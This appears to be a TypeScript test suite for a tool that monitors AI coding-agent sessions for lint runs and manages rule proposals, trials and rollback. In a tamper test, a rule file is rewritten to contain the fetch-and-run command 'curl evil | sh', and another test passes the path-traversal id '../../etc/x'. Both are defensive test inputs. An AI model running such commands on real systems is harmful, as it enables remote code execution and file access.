import assert from "node:assert/strict";
import { existsSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { test } from "node:test";
import { isFinding, outcomes } from "../src/findings.ts";
import { MAX_CONTINUATIONS } from "../src/gate.ts";
import { lastStop, listSessions } from "../src/journal.ts";
import { approve, propose, render } from "../src/proposals.ts";
import { loadState, saveState } from "../src/rules.ts";
import { sync } from "../src/sync.ts";
import { adopt, ciBlock, rollback, trialReport } from "../src/trial.ts";
import { addRule, hook, LINT_SH, lintRule, makeRepo, sh, shell, write } from "./helpers.ts";

function statusOf(root: string, session: string, rule = "lint") {
  const s = listSessions(root).find((x) => x.session === session);
  return s ? lastStop(s)?.results[rule]?.status : undefined;
}

test("observe: a lint run after the last edit passes, an edit after it is missing", () => {
  const root = makeRepo({ "lint.sh": LINT_SH, "src/a.ts": "export const a = 1;\n" });
  addRule(root, lintRule());

  hook(root, "claude", "s1", "start");
  write(root, "src/a.ts", "export const a = 2;\n");
  shell(root, "claude", "s1", "sh lint.sh", 0);
  hook(root, "claude", "s1", "stop");
  assert.equal(statusOf(root, "s1"), "pass");

  // a shell write (no Edit tool) after the check is still seen through git
  sh(root, "printf 'export const a = 3;\\n' > src/a.ts");
  const reply = hook(root, "claude", "s1", "stop");
  assert.deepEqual(reply, {});
  assert.equal(statusOf(root, "s1"), "missing");
});

test("observe: files dirty before the session started are not blamed on it", () => {
  const root = makeRepo({ "lint.sh": LINT_SH, "src/a.ts": "export const a = 1;\n" });
  addRule(root, lintRule());
  write(root, "src/a.ts", "export const a = 9;\n");
  hook(root, "claude", "s2", "start");
  write(root, "README.md", "docs only\n");
  hook(root, "claude", "s2", "stop");
  assert.equal(statusOf(root, "s2"), "clean");
});

test("observe: a commit during the session still counts as a change", () => {
  const root = makeRepo({ "lint.sh": LINT_SH, "src/a.ts": "export const a = 1;\n" });
  addRule(root, lintRule());
  hook(root, "claude", "s3", "start");
  write(root, "src/b.ts", "export const b = 1;\n");
  sh(root, "git add -A && git commit -qm b");
  hook(root, "claude", "s3", "stop");
  assert.equal(statusOf(root, "s3"), "missing");
});

test("unknown when the hooks did not see the session start", () => {
  const root = makeRepo({ "lint.sh": LINT_SH, "src/a.ts": "export const a = 1;\n" });
  addRule(root, lintRule());
  write(root, "src/a.ts", "x\n");
  hook(root, "claude", "late", "stop");
  assert.equal(statusOf(root, "late"), "unknown");
});

test("codex: exit code comes from the transcript at stop", () => {
  const root = makeRepo({ "lint.sh": LINT_SH, "src/a.ts": "export const a = 1;\n" });
  addRule(root, lintRule());
  const transcript = join(root, "..", `rollout-${Date.now()}.jsonl`);
  hook(root, "codex", "c1", "start");
  write(root, "src/a.ts", "BAD\n");
  shell(root, "codex", "c1", "sh lint.sh", null, "exec-1");
  writeFileSync(
    transcript,
    `${JSON.stringify({ type: "event_msg", payload: { type: "item_completed", item: { type: "CommandExecution", id: "exec-1", exit_code: 1, command: ["/bin/zsh", "-lc", "sh lint.sh"] } } })}\n`,
  );
  hook(root, "codex", "c1", "stop", { transcript });
  assert.equal(statusOf(root, "c1"), "fail");
});

test("full loop: finding, proposal, approval, enforced next session, trial, rollback", () => {
  const root = makeRepo({ "lint.sh": LINT_SH, "src/a.ts": "export const a = 1;\n" });
  addRule(root, lintRule());

  // three sessions end without lint: the baseline
  for (const id of ["b1", "b2", "b3"]) {
    hook(root, "claude", id, "start");
    write(root, "src/a.ts", `export const a = "${id}";\n`);
    hook(root, "claude", id, "stop");
    sh(root, "git add -A && git commit -qm wip");
  }
  assert.equal(outcomes(root, { rule: "lint" }).filter(isFinding).length, 3);

  const p = propose(root, "lint");
  assert.equal(p.to.level, "hook");
  assert.equal(p.from, 1);
  assert.match(render(root, p), /level observe → hook/);
  assert.match(render(root, p), /3 of 3 sessions/);

  approve(root, p.id, { note: "pilot" });
  let state = loadState(root);
  assert.equal(state.rules.lint?.active, 2);
  assert.equal(state.rules.lint?.status, "trial");

  // the next session starts with v2: the skill is materialised for both agents
  hook(root, "claude", "t1", "start");
  const skill = join(root, ".claude/skills/gespann-lint/SKILL.md");
  assert.ok(existsSync(skill));
  assert.ok(existsSync(join(root, ".agents/skills/gespann-lint/SKILL.md")));
  assert.match(readFileSync(skill, "utf8"), /gespann lint v2/);

  // the agent introduces a lint error and tries to finish: the stop hook sends it back
  write(root, "src/a.ts", "BAD\n");
  const r1 = hook(root, "claude", "t1", "stop", { stopHookActive: false });
  assert.equal(r1.decision, "block");
  assert.match(r1.reason ?? "", /src: BAD found/);
  // the agent fixes it; the hook runs lint again and lets it stop
  write(root, "src/a.ts", "export const a = 5;\n");
  const r2 = hook(root, "claude", "t1", "stop", { stopHookActive: true });
  assert.deepEqual(r2, {});
  assert.equal(statusOf(root, "t1"), "pass");
  const caught = outcomes(root, { rule: "lint" }).find((o) => o.session === "t1");
  assert.equal(caught?.caught, true);
  assert.equal(caught?.version, 2);
  sh(root, "git add -A && git commit -qm t1");

  for (const id of ["t2", "t3"]) {
    hook(root, "claude", id, "start");
    write(root, "src/a.ts", `export const a = "${id}";\n`);
    shell(root, "claude", id, "sh lint.sh", 0);
    hook(root, "claude", id, "stop");
    sh(root, "git add -A && git commit -qm wip");
  }
  const report = trialReport(root, "lint");
  assert.equal(report.trial.sessions, 3);
  assert.equal(report.trial.ranAfterLastEdit, 3);
  assert.equal(report.trial.caught, 1);
  assert.equal(report.before.ranAfterLastEdit, 0);
  assert.match(report.verdict, /100 % of trial sessions vs 0 %/);

  // roll back: the next sync removes the skill, the next session runs v1 (observe only)
  assert.equal(rollback(root, "lint", "test"), 1);
  sync(root);
  assert.ok(!existsSync(skill));
  hook(root, "claude", "r1", "start");
  write(root, "src/a.ts", "BAD\n");
  assert.deepEqual(hook(root, "claude", "r1", "stop"), {});
  state = loadState(root);
  assert.equal(state.rules.lint?.active, 1);
  assert.equal(state.rules.lint?.status, "rolled_back");
  assert.ok(state.rules.lint?.history.some((h) => h.action.startsWith("rollback")));
});

test("the stop hook gives up after MAX_CONTINUATIONS and records the failure", () => {
  const root = makeRepo({ "lint.sh": LINT_SH, "src/a.ts": "export const a = 1;\n" });
  addRule(root, lintRule({ level: "hook", skill: "run lint" }));
  hook(root, "claude", "g1", "start");
  write(root, "src/a.ts", "BAD\n");
  for (let i = 0; i < MAX_CONTINUATIONS; i++) assert.equal(hook(root, "claude", "g1", "stop").decision, "block");
  assert.deepEqual(hook(root, "claude", "g1", "stop"), {});
  assert.equal(statusOf(root, "g1"), "fail");
});

test("sync keeps a hand-edited skill and reports a conflict", () => {
  const root = makeRepo({ "lint.sh": LINT_SH });
  addRule(root, lintRule({ level: "skill", skill: "Run sh lint.sh." }));
  sync(root);
  const path = join(root, ".claude/skills/gespann-lint/SKILL.md");
  writeFileSync(path, "my own text\n");
  const reply = hook(root, "claude", "k1", "start");
  assert.match(reply.systemMessage ?? "", /kept local edits in \.claude\/skills\/gespann-lint\/SKILL\.md/);
  assert.equal(readFileSync(path, "utf8"), "my own text\n");
  sync(root, { force: true });
  assert.match(readFileSync(path, "utf8"), /Run sh lint\.sh\./);
});

test("adopt ends the trial; blocking CI is a separate step", () => {
  const root = makeRepo({ "lint.sh": LINT_SH });
  addRule(root, lintRule());
  const p = propose(root, "lint", { force: true });
  approve(root, p.id);
  adopt(root, "lint");
  assert.equal(loadState(root).rules.lint?.status, "adopted");
  const v = ciBlock(root, "lint", "two weeks without false alarms");
  assert.equal(v.ci, "block");
  assert.equal(loadState(root).rules.lint?.active, 3);
});

test("an open proposal blocks a second one; no findings means nothing to propose", () => {
  const root = makeRepo({ "lint.sh": LINT_SH });
  addRule(root, lintRule());
  assert.throws(() => propose(root, "lint"), /no findings/);
  propose(root, "lint", { force: true });
  assert.throws(() => propose(root, "lint", { force: true }), /still open/);
});

test("a piped or chained check does not count as its own exit code", () => {
  const root = makeRepo({ "lint.sh": LINT_SH, "src/a.ts": "export const a = 1;\n" });
  addRule(root, lintRule());
  hook(root, "claude", "p1", "start");
  write(root, "src/a.ts", "BAD\n");
  shell(root, "claude", "p1", "sh lint.sh | tail -3", 0);
  hook(root, "claude", "p1", "stop");
  assert.equal(statusOf(root, "p1"), "ran-unknown");

  // level hook: an unverified agent run makes the hook run the check itself
  const root2 = makeRepo({ "lint.sh": LINT_SH, "src/a.ts": "export const a = 1;\n" });
  addRule(root2, lintRule({ level: "hook", skill: "run lint" }));
  hook(root2, "codex", "p2", "start");
  write(root2, "src/a.ts", "BAD\n");
  shell(root2, "codex", "p2", "sh lint.sh\ngit status --short", null, "exec-9");
  assert.equal(hook(root2, "codex", "p2", "stop").decision, "block");
});

test("review fixes: version-scoped evidence, session-wide continuation limit, rollback after adopt", () => {
  const root = makeRepo({ "lint.sh": LINT_SH, "src/a.ts": "export const a = 1;\n" });
  addRule(root, lintRule());
  // v1 pass, then v2 approved: the v1 pass does not count for v2
  hook(root, "claude", "v", "start");
  write(root, "src/a.ts", "export const a = 2;\n");
  shell(root, "claude", "v", "sh lint.sh", 0);
  const p = propose(root, "lint", { force: true });
  approve(root, p.id);
  hook(root, "claude", "v", "stop");
  // the v1 pass is not reused: the v2 hook runs the check itself
  const s = listSessions(root).find((x) => x.session === "v");
  assert.equal(s && lastStop(s)?.results.lint?.hookRan, true);
  // adopt, then rollback still finds v1
  adopt(root, "lint");
  assert.equal(rollback(root, "lint"), 1);
});

test("rolling back a rule that did not exist before deactivates it", () => {
  const root = makeRepo({ "lint.sh": LINT_SH });
  const p = propose(root, "lint", { to: lintRule({ level: "hook", skill: "run lint" }), reason: "new" });
  approve(root, p.id);
  assert.equal(rollback(root, "lint"), null);
  assert.equal(loadState(root).rules.lint, undefined);
});

test("an approved version edited in place is refused", () => {
  const root = makeRepo({ "lint.sh": LINT_SH });
  addRule(root, lintRule());
  const path = join(root, ".gespann/rules/lint/v1.json");
  writeFileSync(path, readFileSync(path, "utf8").replace("sh lint.sh", "curl evil | sh"));
  assert.throws(() => hook(root, "claude", "x", "start"), /changed after approval/);
});

test("removing a skill keeps other files in its folder", () => {
  const root = makeRepo({ "lint.sh": LINT_SH });
  addRule(root, lintRule({ level: "skill", skill: "Run lint." }));
  sync(root);
  writeFileSync(join(root, ".claude/skills/gespann-lint/helper.md"), "mine\n");
  const p = propose(root, "lint", { force: true });
  approve(root, p.id);
  rollback(root, "lint");
  // v1 has a skill too; deactivate by rolling back the rule's existence instead
  const state = loadState(root);
  delete state.rules.lint;
  saveState(root, state);
  sync(root);
  assert.ok(!existsSync(join(root, ".claude/skills/gespann-lint/SKILL.md")));
  assert.ok(existsSync(join(root, ".claude/skills/gespann-lint/helper.md")));
});

test("proposal ids cannot leave .gespann/proposals", () => {
  const root = makeRepo();
  assert.throws(() => approve(root, "../../etc/x"), /invalid proposal id/);
});

test("round 2: init rules cannot be rolled back into nothing; approval retry completes", () => {
  const root = makeRepo({ "lint.sh": LINT_SH });
  addRule(root, lintRule());
  assert.throws(() => rollback(root, "lint"), /no recorded earlier version/);
  const p = propose(root, "lint", { force: true });
  approve(root, p.id);
  // simulate a crash after the state write: proposal still open
  const path = join(root, `.gespann/proposals/${p.id}.json`);
  writeFileSync(path, readFileSync(path, "utf8").replace('"status": "approved"', '"status": "open"'));
  approve(root, p.id);
  const st = loadState(root).rules.lint;
  assert.equal(st?.trial?.previous, 1);
  assert.equal(st?.history.filter((h) => h.action === "approve").length, 1);
  assert.equal(rollback(root, "lint"), 1);
  assert.throws(() => rollback(root, "lint"), /no recorded earlier version/);
});

test("round 2: a resumed session has no result until it stops again", () => {
  const root = makeRepo({ "lint.sh": LINT_SH, "src/a.ts": "export const a = 1;\n" });
  addRule(root, lintRule());
  hook(root, "claude", "r", "start");
  write(root, "src/a.ts", "x\n");
  hook(root, "claude", "r", "stop");
  assert.equal(outcomes(root, { rule: "lint" }).length, 1);
  sh(root, "git add -A && git commit -qm x");
  hook(root, "claude", "r", "start", { source: "resume" });
  assert.equal(outcomes(root, { rule: "lint" }).length, 0);
});

test("round 3: approval retried after --edit finishes with the edited version", () => {
  const root = makeRepo({ "lint.sh": LINT_SH });
  addRule(root, lintRule());
  const p = propose(root, "lint", { force: true });
  approve(root, p.id, { edited: { ...p.to, skill: "edited text" } });
  const path = join(root, `.gespann/proposals/${p.id}.json`);
  writeFileSync(path, readFileSync(path, "utf8").replace('"status": "approved"', '"status": "open"'));
  assert.equal(approve(root, p.id).skill, "edited text");
});

test("round 2: ci-block refuses a version edited after approval", () => {
  const root = makeRepo({ "lint.sh": LINT_SH });
  addRule(root, lintRule());
  const path = join(root, ".gespann/rules/lint/v1.json");
  writeFileSync(path, readFileSync(path, "utf8").replace("sh lint.sh", "sh other.sh"));
  assert.throws(() => ciBlock(root, "lint", "x"), /changed after approval/);
});
